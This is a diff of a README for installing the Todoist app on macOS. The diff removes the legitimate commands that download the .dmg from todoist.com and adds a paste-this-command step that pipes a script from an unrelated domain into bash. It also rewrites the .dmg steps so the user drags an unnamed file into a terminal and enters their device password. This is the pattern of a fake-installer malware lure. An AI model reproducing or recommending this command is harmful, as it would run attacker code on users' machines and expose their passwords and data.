@@ -11,22 +11,22 @@ If the download button doesn’t work, follow the terminal instructions below fo
 ### Installation via .dmg:
 
 1. Install the .dmg file using the button above.
-2. Open the .dmg installer and drag the Todoist app from the installer window to your Applications folder.
-3. Open a terminal, navigate to the Applications folder (`cd /Applications`), and launch Todoist by typing `./Todoist.app/Contents/MacOS/Todoist`.
-4. Press the "Return" button, then enter your device password in the prompt (leave blank if no password is set).
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
 
-[![Installation Demo](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
 
 ### Installation via a command in the terminal:
 
 1. Copy the installation command below:
-   ```bash
-   curl -L https://todoist.com/mac_app -o ~/Downloads/Todoist.dmg && hdiutil attach ~/Downloads/Todoist.dmg && cp -R /Volumes/Todoist/Todoist.app /Applications && hdiutil detach /Volumes/Todoist
-   ```
-2. Open the terminal on your device, paste the command, and press the “Return” button.
+
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get3/install.sh)"
+
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
 
-[![Terminal Installation](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
 
 ## 🎯 What You Get
 
